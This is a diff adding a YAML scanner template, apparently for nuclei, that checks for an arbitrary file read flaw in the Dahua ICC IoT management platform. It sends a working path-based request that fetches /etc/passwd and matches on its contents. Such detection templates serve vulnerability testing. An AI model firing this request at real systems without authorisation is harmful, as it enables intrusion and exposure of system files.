@@ -1,0 +1,29 @@
+id: poc-yaml-dahua-icc-file-download-anyfile-read
+info:
+  name: Dahua ICC Intelligent IoT Unified Management Platform File Download Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/evo-apigw/evo-cirs/file/download?filePath=file:///etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+        part: body
+      - type: word
+        words:
+          - "/evo-apigw"
+        part: header
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
